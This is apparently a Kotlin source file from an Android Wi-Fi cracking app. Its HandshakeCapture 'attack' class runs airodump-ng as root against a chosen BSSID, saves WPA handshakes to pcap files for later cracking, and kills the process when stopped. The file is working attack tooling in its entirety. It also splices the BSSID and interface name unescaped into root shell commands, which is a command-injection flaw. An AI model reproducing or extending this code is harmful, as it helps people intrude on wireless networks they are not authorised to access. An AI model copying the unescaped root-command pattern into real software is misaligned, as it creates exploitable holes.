package com.wificracker.attack.domain.attacks

import com.wificracker.attack.model.Attack
import com.wificracker.core.root.BinaryInstaller
import com.wificracker.core.root.ShellExecutor
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.flow
import kotlinx.coroutines.flow.flowOn
import javax.inject.Inject
import javax.inject.Singleton

@Singleton
class HandshakeCapture @Inject constructor(
    private val shellExecutor: ShellExecutor,
    private val binaryInstaller: BinaryInstaller,
) : WifiAttack {
    companion object { private const val CAPTURE_DIR = "/data/local/tmp/wificracker/captures" }

    override fun execute(attack: Attack): Flow<String> = flow {
        shellExecutor.executeAsRoot("mkdir -p $CAPTURE_DIR")
        val outputPrefix = "$CAPTURE_DIR/hs_${attack.targetBssid.replace(":", "")}_${System.currentTimeMillis()}"
        val binary = binaryInstaller.getBinaryPath("airodump-ng")
        emit("[*] Capturing handshake for ${attack.targetBssid} on channel...")
        val cmd = "$binary --bssid ${attack.targetBssid} --write $outputPrefix --output-format pcap ${attack.interfaceName}"
        shellExecutor.executeAsRoot(cmd, timeoutSeconds = 120)
        emit("[+] Capture saved to $outputPrefix")
    }.flowOn(Dispatchers.IO)

    override fun stop(attack: Attack) {
        shellExecutor.executeAsRoot("pkill -f 'airodump-ng.*${attack.targetBssid}'")
    }
}
